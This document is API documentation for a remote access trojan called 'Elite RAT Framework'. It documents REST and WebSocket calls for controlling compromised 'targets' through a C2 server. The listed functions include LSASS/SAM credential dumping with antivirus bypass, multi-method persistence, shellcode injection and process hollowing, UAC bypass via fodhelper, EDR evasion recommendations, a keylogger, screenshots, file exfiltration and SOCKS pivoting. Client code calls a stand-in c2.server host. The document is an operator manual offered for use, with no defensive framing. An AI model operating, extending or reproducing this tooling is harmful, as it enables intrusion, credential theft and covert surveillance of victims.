# 📖 Elite RAT Framework - API Documentation

## REST API Endpoints

### Authentication

#### POST /api/auth/login
Authenticate and receive session token.

**Request:**
```json
{
    "username": "admin",
    "password": "password123"
}
```

**Response:**
```json
{
    "success": true,
    "token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
    "expires": "2024-12-31T23:59:59"
}
```

### Command Execution

#### POST /api/execute
Execute command on target system.

**Headers:**
- `X-CSRFToken`: CSRF token
- `Authorization`: Bearer <token>

**Request:**
```json
{
    "connection_id": "target-001",
    "command": "hashdump",
    "parameters": {}
}
```

**Response:**
```json
{
    "success": true,
    "command": "hashdump",
    "output": "...",
    "timestamp": "2024-01-01T12:00:00",
    "source": "elite"
}
```

#### GET /api/elite/status
Get elite executor status.

**Response:**
```json
{
    "executor_ready": true,
    "available_commands": ["hashdump", "persistence", ...],
    "version": "2.0",
    "encryption_enabled": true
}
```

### Connection Management

#### GET /api/connections
List all active connections.

**Response:**
```json
{
    "connections": [
        {
            "id": "target-001",
            "hostname": "DESKTOP-ABC123",
            "ip": "192.168.1.100",
            "os": "Windows 10",
            "last_seen": "2024-01-01T12:00:00",
            "status": "active"
        }
    ],
    "total": 1
}
```

#### POST /api/connections/{id}/disconnect
Disconnect specific target.

#### DELETE /api/connections/{id}
Remove connection from database.

## WebSocket Events

### Connection Events

#### connect
Client connected to WebSocket.
```javascript
socket.on('connect', function() {
    console.log('Connected to C2');
});
```

#### new_connection
New target connected.
```javascript
socket.on('new_connection', function(data) {
    console.log('New target:', data.hostname);
});
```

#### connection_lost
Target disconnected.
```javascript
socket.on('connection_lost', function(data) {
    console.log('Lost target:', data.id);
});
```

### Command Events

#### command_result
Command execution result.
```javascript
socket.on('command_result', function(data) {
    console.log('Result:', data.output);
});
```

#### command_error
Command execution failed.
```javascript
socket.on('command_error', function(data) {
    console.error('Error:', data.error);
});
```

## Elite Commands API

### System Information

#### sysinfo
Get comprehensive system information.
```python
result = elite_executor.execute('sysinfo')
```

**Returns:**
```json
{
    "hostname": "DESKTOP-ABC",
    "os": "Windows 10",
    "version": "10.0.19043",
    "architecture": "x64",
    "cpu": "Intel Core i7",
    "memory": "16GB",
    "user": "admin"
}
```

### Credential Operations

#### hashdump
Dump password hashes.
```python
result = elite_executor.execute('hashdump', method='lsass')
```

**Parameters:**
- `method`: 'lsass', 'sam', 'cached' (default: 'auto')
- `bypass_av`: boolean (default: true)

**Returns:**
```json
{
    "success": true,
    "hashes": [
        {
            "username": "Administrator",
            "rid": 500,
            "lm": "aad3b435b51404eeaad3b435b51404ee",
            "ntlm": "31d6cfe0d16ae931b73c59d7e0c089c0"
        }
    ],
    "method_used": "lsass_direct"
}
```

### Persistence

#### persistence install
Install persistence mechanism.
```python
result = elite_executor.execute('persistence', 
    action='install',
    method='all'
)
```

**Parameters:**
- `action`: 'install', 'remove', 'check'
- `method`: 'registry', 'service', 'wmi', 'scheduled_task', 'all'
- `payload_url`: URL for payload download

**Returns:**
```json
{
    "success": true,
    "methods_installed": ["registry", "service", "wmi"],
    "methods_failed": [],
    "persistence_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
}
```

### Process Operations

#### inject
Inject into process.
```python
result = elite_executor.execute('inject',
    pid=1234,
    payload=shellcode
)
```

**Parameters:**
- `pid`: Target process ID
- `payload`: Shellcode bytes
- `method`: 'createremotethread', 'setthreadcontext', 'queueuserapc'

#### migrate
Migrate to another process.
```python
result = elite_executor.execute('migrate',
    target='explorer.exe'
)
```

**Parameters:**
- `target`: Process name or PID
- `method`: 'hollow', 'inject', 'fork'

### Network Operations

#### port_forward
Create port forward.
```python
result = elite_executor.execute('port_forward',
    local_port=8080,
    remote_host='internal.server',
    remote_port=80
)
```

#### socks_proxy
Start SOCKS proxy.
```python
result = elite_executor.execute('socks_proxy',
    port=1080,
    auth=False
)
```

### Anti-Detection

#### escalate
Privilege escalation.
```python
result = elite_executor.execute('escalate',
    method='auto',
    bypass_uac=True
)
```

**Methods:**
- `fodhelper`: UAC bypass via fodhelper
- `computerdefaults`: UAC bypass via ComputerDefaults
- `token`: Token manipulation
- `service`: Service escalation

#### avscan
Detect AV/EDR products.
```python
result = elite_executor.execute('avscan',
    detailed=True
)
```

**Returns:**
```json
{
    "av_products": ["Windows Defender"],
    "edr_products": ["CrowdStrike"],
    "recommendations": ["Use process hollowing", "Apply ETW bypass"]
}
```

### File Operations

#### download
Download file from target.
```python
result = elite_executor.execute('download',
    path='C:\\sensitive.doc'
)
```

#### upload
Upload file to target.
```python
result = elite_executor.execute('upload',
    path='C:\\temp\\payload.exe',
    data=file_bytes
)
```

### Advanced Features

#### shell
Execute shell command.
```python
result = elite_executor.execute('shell',
    command='whoami /all'
)
```

#### keylogger
Start/stop keylogger.
```python
result = elite_executor.execute('keylogger',
    action='start',
    duration=300
)
```

#### screenshot
Take screenshot.
```python
result = elite_executor.execute('screenshot',
    monitors='all'
)
```

## Error Codes

| Code | Description |
|------|-------------|
| 200 | Success |
| 400 | Bad Request |
| 401 | Unauthorized |
| 403 | Forbidden |
| 404 | Not Found |
| 500 | Internal Server Error |
| 503 | Service Unavailable |

## Rate Limiting

- Default: 100 requests per minute
- Burst: 10 requests per second
- Headers: `X-RateLimit-Limit`, `X-RateLimit-Remaining`

## Encryption

All API communications support AES-256-GCM encryption:

```python
from Core.crypto_system import get_crypto

crypto = get_crypto()
encrypted_command = crypto.encrypt_command(command_dict)
```

## Authentication

### API Key Authentication
```bash
curl -H "X-API-Key: your-api-key" https://c2.server/api/status
```

### JWT Token Authentication
```bash
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGc..." https://c2.server/api/connections
```

## Examples

### Python Client
```python
import requests

# Login
response = requests.post('https://c2.server/api/auth/login', 
    json={'username': 'admin', 'password': 'password'})
token = response.json()['token']

# Execute command
headers = {'Authorization': f'Bearer {token}'}
response = requests.post('https://c2.server/api/execute',
    headers=headers,
    json={
        'connection_id': 'target-001',
        'command': 'sysinfo'
    })
print(response.json())
```

### JavaScript Client
```javascript
// Connect to WebSocket
const socket = io('https://c2.server');

// Execute command
fetch('/api/execute', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRFToken': getCsrfToken()
    },
    body: JSON.stringify({
        connection_id: 'target-001',
        command: 'hashdump'
    })
})
.then(response => response.json())
.then(data => console.log(data));
```

---

For complete command reference, see [ELITE_ALL_COMMANDS_COMPLETE.md](./ELITE_ALL_COMMANDS_COMPLETE.md)